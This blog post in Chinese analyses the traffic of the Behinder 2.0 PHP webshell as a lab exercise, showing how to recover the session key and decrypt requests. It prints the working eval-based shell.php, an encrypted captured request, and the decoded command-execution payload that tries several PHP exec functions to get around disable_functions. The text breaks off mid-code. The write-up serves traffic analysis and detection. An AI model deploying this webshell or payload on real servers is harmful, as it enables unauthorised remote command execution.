    <content type="html"><![CDATA[<p>冰蝎为一款主流Webshell管理工具，本篇分析Benhinder2.0中php shell流量。</p><p>Github:<a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v2.0" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder/releases/tag/Behinder_v2.0</a></p><p>测试环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Win7</span><br><span class="line">PhpStudy</span><br><span class="line">Behinder2.0</span><br></pre></td></tr></table></figure></p><p>为了方便测试，php需开启openssl插件。<br><img src="/2021/06/23/behinder2-analysis/openssl.png" alt></p><p>Behinder内置Webshell，在server目录下</p><p>shell.php内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&apos;pass&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $key=substr(md5(uniqid(rand())),16);</span><br><span class="line">    $_SESSION[&apos;k&apos;]=$key;</span><br><span class="line">    print $key;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $key=$_SESSION[&apos;k&apos;];</span><br><span class="line">$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">$post=$t($post.&quot;&quot;);</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">     $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">&#125;</span><br><span class="line">    $arr=explode(&apos;|&apos;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代码中我们可以看出，若开启了openssl，则会采用AES128-&gt;base64进行解密，若未开启openssl，则会使用base64-&gt;异或进行解密。</p><p>将/server/shell.php放置在phpstudy网站目录中，使用Behinder2.0进行连接，默认密码为<strong>pass</strong><br><img src="/2021/06/23/behinder2-analysis/pass.png" alt><br>成功连接<br><img src="/2021/06/23/behinder2-analysis/success.png" alt></p><h1 id="流量解密"><a href="#流量解密" class="headerlink" title="流量解密"></a>流量解密</h1><p>这里为了直观我将流量代理至burp进行分析<br><img src="/2021/06/23/behinder2-analysis/daili.png" alt><br>再次打开webshell，burp中发现以下流量包<br><img src="/2021/06/23/behinder2-analysis/4.png" alt><br>Behinder前两次会进行密钥的获取和更新，我们需要获取第二次的密钥，也就是这里的<strong>7e42737bc70ea538</strong>，第三个包会确定content参数的值，第四个包会获取phpinfo系信息（这几步你可以看完下面的解密方式之后再回过头来看到底做了什么）<br><img src="/2021/06/23/behinder2-analysis/db71.png" alt><br>获取到了之后，由于Behinder2.0流量传输是使用的AES加密，我们可以获取秘钥之后可以进行解密<br>AES解密：<a href="http://tools.bugscaner.com/cryptoaes/" target="_blank" rel="noopener">http://tools.bugscaner.com/cryptoaes/</a><br>Base64解密：<a href="https://tool.oschina.net/encrypt?type=3" target="_blank" rel="noopener">https://tool.oschina.net/encrypt?type=3</a></p><p>这里在Behinder中通过cmd查询当前用户<br><img src="/2021/06/23/behinder2-analysis/whoami.png" alt></p><p>POST请求数据如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure></p><p>使用之前获取的秘钥进行解密：<br><img src="/2021/06/23/behinder2-analysis/aes.png" alt><br>AES解密之后将base64_decode中的内容进行base64解密能还原出请求的php代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGVycm9yX3JlcG9ydGluZygwKTsNCg0KZnVuY3Rpb24gZ2V0U2FmZVN0cigkc3RyKXsNCiAgICAkczEgPSBpY29udigndXRmLTgnLCdnYmsvL0lHTk9SRScsJHN0cik7DQogICAgJHMwID0gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzMSk7DQogICAgaWYoJHMwID09ICRzdHIpew0KICAgICAgICByZXR1cm4gJHMwOw0KICAgIH1lbHNlew0KICAgICAgICByZXR1cm4gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzdHIpOw0KICAgIH0NCn0NCmZ1bmN0aW9uIG1haW4oJGNtZCkNCnsNCiAgICBAc2V0X3RpbWVfbGltaXQoMCk7DQogICAgQGlnbm9yZV91c2VyX2Fib3J0KDEpOw0KICAgIEBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsNCiAgICAkcmVzdWx0ID0gYXJyYXkoKTsNCiAgICAkUGFkdEpuID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7DQogICAgaWYgKCEgZW1wdHkoJFBhZHRKbikpIHsNCiAgICAgICAgJFBhZHRKbiA9IHByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBleHBsb2RlKCcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBhcnJheV9tYXAoJ3RyaW0nLCAkUGFkdEpuKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkUGFkdEpuID0gYXJyYXkoKTsNCiAgICB9DQogICAgJGMgPSAkY21kOw0KICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicpKSB7DQogICAgICAgICRjID0gJGMgLiAiIDI+JjFcbiI7DQogICAgfQ0KICAgICRKdWVRREJIID0gJ2lzX2NhbGxhYmxlJzsNCiAgICAkQnZjZSA9ICdpbl9hcnJheSc7DQogICAgaWYgKCRKdWVRREJIKCdzeXN0ZW0nKSBhbmQgISAkQnZjZSgnc3lzdGVtJywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgc3lzdGVtKCRjKTsNCiAgICAgICAgJGtXSlcgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICAgICAgb2JfZW5kX2NsZWFuKCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgncHJvY19vcGVuJykgYW5kICEgJEJ2Y2UoJ3Byb2Nfb3BlbicsICRQYWR0Sm4pKSB7DQogICAgICAgICRoYW5kbGUgPSBwcm9jX29wZW4oJGMsIGFycmF5KA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgJ3BpcGUnLA0KICAgICAgICAgICAgICAgICdyJw0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgICdwaXBlJywNCiAgICAgICAgICAgICAgICAndycNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICAncGlwZScsDQogICAgICAgICAgICAgICAgJ3cnDQogICAgICAgICAgICApDQogICAgICAgICksICRwaXBlcyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgd2hpbGUgKCEgZmVvZigkcGlwZXNbMV0pKSB7DQogICAgICAgICAgICAka1dKVyAuPSBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KICAgICAgICB9DQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ3Bhc3N0aHJ1JykgYW5kICEgJEJ2Y2UoJ3Bhc3N0aHJ1JywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgcGFzc3RocnUoJGMpOw0KICAgICAgICAka1dKVyA9IG9iX2dldF9jb250ZW50cygpOw0KICAgICAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdzaGVsbF9leGVjJykgYW5kICEgJEJ2Y2UoJ3NoZWxsX2V4ZWMnLCAkUGFkdEpuKSkgew0KICAgICAgICAka1dKVyA9IHNoZWxsX2V4ZWMoJGMpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ2V4ZWMnKSBhbmQgISAkQnZjZSgnZXhlYycsICRQYWR0Sm4pKSB7DQogICAgICAgICRrV0pXID0gYXJyYXkoKTsNCiAgICAgICAgZXhlYygkYywgJGtXSlcpOw0KICAgICAgICAka1dKVyA9IGpvaW4oY2hyKDEwKSwgJGtXSlcpIC4gY2hyKDEwKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdleGVjJykgYW5kICEgJEJ2Y2UoJ3BvcGVuJywgJFBhZHRKbikpIHsNCiAgICAgICAgJGZwID0gcG9wZW4oJGMsICdyJyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCRmcCkpIHsNCiAgICAgICAgICAgIHdoaWxlICghIGZlb2YoJGZwKSkgew0KICAgICAgICAgICAgICAgICRrV0pXIC49IGZyZWFkKCRmcCwgMTAyNCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgQHBjbG9zZSgkZnApOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRrV0pXID0gMDsNCiAgICAgICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJmYWlsIik7DQogICAgICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZSgibm9uZSBvZiBwcm9jX29wZW4vcGFzc3RocnUvc2hlbGxfZXhlYy9leGVjL2V4ZWMgaXMgYXZhaWxhYmxlIik7DQogICAgICAgICRrZXkgPSAkX1NFU1NJT05bJ2snXTsNCiAgICAgICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAka2V5KTsNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICB9DQogICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKGdldFNhZmVTdHIoJGtXSlcpKTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICAkX1NFU1NJT05bJ2snXSk7DQp9DQoNCmZ1bmN0aW9uIGVuY3J5cHQoJGRhdGEsJGtleSkNCnsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQ0KICAgIAl7DQogICAgCQlmb3IoJGk9MDskaTxzdHJsZW4oJGRhdGEpOyRpKyspIHsNCiAgICAJCQkgJGRhdGFbJGldID0gJGRhdGFbJGldXiRrZXlbJGkrMSYxNV07IA0KICAgIAkJCX0NCgkJCXJldHVybiAkZGF0YTsNCiAgICAJfQ0KICAgIGVsc2UNCiAgICAJew0KICAgIAkJcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZGF0YSwgIkFFUzEyOCIsICRrZXkpOw0KICAgIAl9DQp9JGNtZD0id2hvYW1pIjsNCm1haW4oJGNtZCk7</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str);</span><br><span class="line">    $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&apos;max_execution_time&apos;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&apos;disable_functions&apos;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&apos;/[, ]+/&apos;, &apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&apos;trim&apos;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    $c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &apos;win&apos;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &apos;is_callable&apos;;</span><br><span class="line">    $Bvce = &apos;in_array&apos;;</span><br><span class="line">    if ($JueQDBH(&apos;system&apos;) and ! $Bvce(&apos;system&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;proc_open&apos;) and ! $Bvce(&apos;proc_open&apos;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;r&apos;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;w&apos;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;w&apos;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;passthru&apos;) and ! $Bvce(&apos;passthru&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;shell_exec&apos;) and ! $Bvce(&apos;shell_exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;popen&apos;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, &apos;r&apos;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&apos;k&apos;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = 